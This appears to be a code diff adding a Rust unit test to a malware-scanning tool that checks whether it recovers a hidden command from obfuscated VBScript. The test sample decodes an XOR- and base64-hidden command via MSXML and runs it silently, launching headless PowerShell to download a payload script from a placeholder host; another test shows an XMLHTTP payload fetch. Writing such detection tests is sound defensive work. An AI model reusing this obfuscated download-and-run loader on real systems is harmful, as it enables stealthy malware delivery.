@@ -20479,6 +20479,54 @@ Execute "sh." & method & " cmd, 0, False""#;
     }
 
     #[test]
+    fn standalone_vbs_nodetypedvalue_xor_command_is_recovered() {
+        let mut env = Environment::new(&Config::default());
+        let command = b"conhost.exe --headless powershell.exe -Command Invoke-WebRequest -Uri https://vbs-nodetypedvalue.example/payload.ps1";
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            command.iter().map(|byte| byte ^ 42).collect::<Vec<u8>>(),
+        );
+        let vbs = format!(
+            r#"Dim encoded, key, dtype, bytes, i, cmd
+encoded = "{encoded}"
+key = 42
+Dim dtype_values
+dtype_values = Array(72, 67, 68, 4, 72, 75, 89, 79, 28, 30)
+dtype = ""
+For i = 0 To UBound(dtype_values)
+    dtype = dtype & Chr(dtype_values(i) Xor 42)
+Next
+Set xml = CreateObject("MSXML2.DOMDocument.6.0")
+Set node = xml.CreateElement("tmp")
+node.DataType = dtype
+node.Text = encoded
+ReDim bytes(LenB(node.NodeTypedValue) - 1)
+For i = 0 To UBound(bytes)
+    bytes(i) = AscB(MidB(node.NodeTypedValue, i + 1, 1))
+Next
+For i = 0 To UBound(bytes)
+    bytes(i) = bytes(i) Xor key
+Next
+cmd = ""
+For i = 0 To UBound(bytes)
+    cmd = cmd & Chr(bytes(i))
+Next
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False"#
+        );
+        env.all_extracted_vbs.push(vbs.into_bytes());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|ps| String::from_utf8_lossy(ps)
+                    .contains("https://vbs-nodetypedvalue.example/payload.ps1")),
+            "VBS NodeTypedValue/XOR command did not extract PS: {:?}",
+            env.all_extracted_ps1
+        );
+    }
+
+    #[test]
     fn standalone_vbs_execute_prefix_xmlhttp_url_extracted() {
         let vbs = br#"Execute "Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-execute.example/payload.txt"", False: http.Send""#;
         let report = analyze(vbs, &Config::default());
